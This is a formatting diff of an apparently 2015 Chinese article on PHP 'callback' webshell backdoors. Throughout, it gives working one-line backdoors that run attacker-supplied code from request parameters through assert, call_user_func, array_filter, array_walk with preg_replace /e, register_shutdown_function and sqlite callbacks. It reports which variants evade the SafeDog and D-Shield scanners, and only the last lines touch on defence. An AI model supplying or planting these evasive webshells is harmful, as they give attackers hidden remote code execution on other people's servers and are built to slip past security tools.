@@ -2,7 +2,7 @@
 phith0n · 2015/07/20 10:58
 0x00 前言
 
-最近很多人分享一些过狗过盾的一句话，但无非是用各种方法去构造一些动态函数，比如$_GET['func']($_REQUEST['pass'])之类的方法。万变不离其宗，但这种方法，虽然狗盾可能看不出来，但人肉眼其实很容易发现这类后门的。
+最近很多人分享一些过狗过盾的一句话，但无非是用各种方法去构造一些动态函数，比如'''$_GET['func']($_REQUEST['pass'])'''之类的方法。万变不离其宗，但这种方法，虽然狗盾可能看不出来，但人肉眼其实很容易发现这类后门的。
 
 那么，我就分享一下，一些不需要动态函数、不用eval、不含敏感函数、免杀免拦截的一句话。
 
@@ -23,8 +23,6 @@ phith0n · 2015/07/20 10:58
 
 php中call_user_func是执行回调函数的标准方法，这也是一个比较老的后门了：
 
-1
-
     call_user_func('assert', $_REQUEST['pass']);
 
 assert直接作为回调函数，然后$_REQUEST['pass']作为assert的参数调用。
@@ -34,11 +32,10 @@ assert直接作为回调函数，然后$_REQUEST['pass']作为assert的参数调
 
 可php的函数库是很丰富的，只要简单改下函数安全狗就不杀了：
 
-1
 
     call_user_func_array('assert', array($_REQUEST['pass']));
 
-call_user_func_array函数，和call_user_func类似，只是第二个参数可以传入参数列表组成的数组。如图：
+'''call_user_func_array'''函数，和'''call_user_func'''类似，只是第二个参数可以传入参数列表组成的数组。如图：
 
 
 可见，虽然狗不杀了，D盾还是聪明地识别了出来。
@@ -53,13 +50,13 @@ call_user_func_array函数，和call_user_func类似，只是第二个参数可�
     $arr = array($_POST['pass'],);
     array_filter($arr, base64_decode($e));
 
-array_filter函数是将数组中所有元素遍历并用指定函数处理过滤用的，如此调用（此后的测试环境都是开着狗的，可见都可以执行）：
+'''array_filter'''函数是将数组中所有元素遍历并用指定函数处理过滤用的，如此调用（此后的测试环境都是开着狗的，可见都可以执行）：
 
 
 这个后门，狗查不出来，但D盾还是有感应，报了个等级3（显然比之前的等级4要低了）：
 
 
-类似array_filter，array_map也有同样功效：
+类似'''array_filter'''，'''array_map'''也有同样功效：
 
     $e = $_REQUEST['e'];
     $arr = array($_POST['pass'],);
@@ -74,7 +71,6 @@ array_filter函数是将数组中所有元素遍历并用指定函数处理过�
 php 5.4.8+后的版本，assert函数由一个参数，增加了一个可选参数descrition：
 
 
-
 这就增加（改变）了一个很好的“执行代码”的方法assert，这个函数可以有一个参数，也可以有两个参数。那么以前回调后门中有两个参数的回调函数，现在就可以使用了。
 
 比如如下回调后门：
@@ -86,12 +82,10 @@ php 5.4.8+后的版本，assert函数由一个参数，增加了一个可选参�
 这个后门在php5.3时会报错，提示assert只能有一个参数：
 
 
-
 php版本改作5.4后就可以执行了：
 
 
 这个后门，狗和盾是都查不出来的：
-
 
 
 同样的道理，这个也是功能类似：
@@ -128,18 +122,17 @@ php版本改作5.4后就可以执行了：
 
 0x04 三参数回调函数
 
-有些函数需要的回调函数类型比较苛刻，回调格式需要三个参数。比如array_walk。
+有些函数需要的回调函数类型比较苛刻，回调格式需要三个参数。比如'''array_walk'''。
 
-array_walk的第二个参数是callable类型，正常情况下它是格式是两个参数的，但在0x03中说了，两个参数的回调后门需要使用php5.4.8后的assert，在5.3就不好用了。但这个回调其实也可以接受三个参数，那就好办了：
+'''array_walk'''的第二个参数是callable类型，正常情况下它是格式是两个参数的，但在0x03中说了，两个参数的回调后门需要使用php5.4.8后的assert，在5.3就不好用了。但这个回调其实也可以接受三个参数，那就好办了：
 
-enter image description here
 
 php中，可以执行代码的函数：
 
 1.  一个参数：'''assert'''
 2.  两个参数：'''assert （php5.4.8+'''）
 3.  三个参数：'''preg_replace /e模式'''
-三个参数可以用preg_replace。所以我这里构造了一个array_walk + preg_replace的回调后门：
+三个参数可以用'''preg_replace'''。所以我这里构造了一个'''array_walk'''+ '''preg_replace'''的回调后门：
 
     $e = $_REQUEST['e'];
     $arr = array($_POST['pass'] => '|.*|e',);
@@ -150,7 +143,7 @@ php中，可以执行代码的函数：
 
 但强大的D盾还是有警觉（虽然只是等级2）：
 
-不过呵呵，PHP拥有那么多灵活的函数，稍微改个函数（array_walk_recursive）D盾就查不出来了：
+不过呵呵，PHP拥有那么多灵活的函数，稍微改个函数（'''array_walk_recursive'''）D盾就查不出来了：
 
     $e = $_REQUEST['e'];
     $arr = array($_POST['pass'] => '|.*|e',);
@@ -187,7 +180,7 @@ ob_start可以传入一个参数，也就是当缓冲流输出时调用的函数
 
 0x06 单参数后门终极奥义
 
-preg_replace、三参数后门虽然好用，但/e模式php5.5以后就废弃了，不知道哪天就会给删了。所以我觉得还是单参数后门，在各个版本都比较好驾驭。 这里给出几个好用不杀的回调后门
+'''preg_replace'''、三参数后门虽然好用，但/e模式php5.5以后就废弃了，不知道哪天就会给删了。所以我觉得还是单参数后门，在各个版本都比较好驾驭。 这里给出几个好用不杀的回调后门
 
     $e = $_REQUEST['e'];
     register_shutdown_function($e, $_REQUEST['pass']);
@@ -223,8 +216,6 @@ preg_replace、三参数后门虽然好用，但/e模式php5.5以后就废弃了
 
 执行之：
 
-    enter image description here
-
 上面的sqlite方法是依靠PDO执行的，我们也可以直接调用sqlite3的方法构造回调后门：
 
 
@@ -258,9 +249,9 @@ preg_replace、三参数后门虽然好用，但/e模式php5.5以后就废弃了
 
 上面说了，回调函数格式为1、2、3参数的时候，可以利用assert、assert、preg_replace来执行代码。但如果回调函数的格式是其他参数数目，或者参数类型不是简单字符串，怎么办？
 
-举个例子，php5.5以后建议用preg_replace_callback代替preg_replace的/e模式来处理正则执行替换，那么其实preg_replace_callback也是可以构造回调后门的。
+举个例子，php5.5以后建议用'''preg_replace_callback'''代替'''preg_replace'''的/e模式来处理正则执行替换，那么其实'''preg_replace_callback'''也是可以构造回调后门的。
 
-preg_replace_callback的第二个参数是回调函数，但这个回调函数被传入的参数是一个数组，如果直接将这个指定为assert，就会执行不了，因为assert接受的参数是字符串。
+'''preg_replace_callback'''的第二个参数是回调函数，但这个回调函数被传入的参数是一个数组，如果直接将这个指定为assert，就会执行不了，因为assert接受的参数是字符串。
 
 所以我们需要去“构造”一个满足条件的回调函数。
 
@@ -290,3 +281,5 @@ preg_replace_callback的第二个参数是回调函数，但这个回调函数�
 实际上，回调后门是灵活且无穷无尽的后门，只要php还在发展，那么就有很多很多拥有回调函数的后门被创造。想要防御这样的后门，光光去指哪防哪肯定是不够的。
 
 简单想一下，只有我们去控制住assert、preg_replace这类函数，才有可能防住这种漏洞。
+
+[link](http://drops.wooyun.org/tips/7279)
